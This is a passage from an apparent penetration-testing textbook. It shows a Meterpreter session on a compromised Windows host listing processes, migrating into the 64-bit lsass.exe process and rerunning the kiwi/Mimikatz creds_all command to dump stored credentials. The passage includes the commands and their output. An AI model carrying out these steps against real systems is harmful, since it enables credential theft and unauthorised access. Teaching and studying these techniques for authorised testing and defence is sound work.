  md: 'However, when we run the **creds_all** command, we find that there is no information
    returned. Remember the warning stating that we''re running 32-bit on a 64-bit
    machine? This likely means that there was a conflict when attempting to use the
    32-bit process to access the 64-bit data. To fix this, we can try to migrate to
    a 64-bit process.


    ```

    ```text

    meterpreter > creds_all

    [*] Running as SYSTEM

    [*] Retrieving all credentials


    meterpreter >

    ```

    ```


    **FIGURE 6.24** Attempting to gather all available credentials on the system without
    any results. This is due to the 32-bit and 64-bit conflict.


    To access and migrate to a 64-bit process, we need to run the **ps** command to
    list the running processes. This is supported by Meterpreter and allows us to
    see which processes are running, what architecture they are, and who owns them.


    ```

    ```text

    meterpreter > ps


    Process List

    ============

    PID   PPID  Name             Arch  Session  User                         Path

    0     0     [System Process]

    4     0     System           x64   0

    88    4     Registry         x64   0

    300   4     smss.exe         x64   0

    344   608   svchost.exe      x64   0      NT AUTHORITY\\SYSTEM          C:\\Windows\\System32\\svchost.exe

    364   608   svchost.exe      x64   0      NT AUTHORITY\\LOCAL SERVICE   C:\\Windows\\System32\\svchost.exe

    400   392   csrss.exe        x64   0

    476   392   wininit.exe      x64   0

    608   476   services.exe     x64   0

    624   608   svchost.exe      x64   0      NT AUTHORITY\\SYSTEM          C:\\Windows\\System32\\svchost.exe

    632   476   lsass.exe        x64   0      NT AUTHORITY\\SYSTEM          C:\\Windows\\System32\\lsass.exe

    ```

    ```


    **FIGURE 6.25** Running the Meterpreter ps command shows a (trimmed) list of running
    processes. Note the lsass.exe process is running as PID 632 with x64 architecture.


    The **lsass.exe** program is the most important program to target when attempting
    to use Mimikatz/kiwi on a Windows system. This is because it is the Local Security
    Authority Subsystem Service, which is a critical system service for Microsoft
    machines to manage authentication information. Gaining access to this process
    directly with Meterpreter ensures that our Mimikatz users can access the most
    information possible. In the screenshot of the ps listing, we can see that lsass.exe
    is running as **NT\SYSTEM** with a process ID (PID) of 632. To migrate, all we
    need to do is simply run the **migrate 632** command.


    ```

    ```text

    meterpreter > migrate 632

    [*] Migrating from 3160 to 632 ...

    [*] Migration completed successfully.

    ```

    ```


    **FIGURE 6.26** Migrating the Meterpreter process to the LSASS process with the
    PID of 632.


    Once migrated, we can run the **creds_all** command again. This will now return
    all of the stored credentials within the system, and if we’re lucky, some plaintext
    passwords within it as well.'
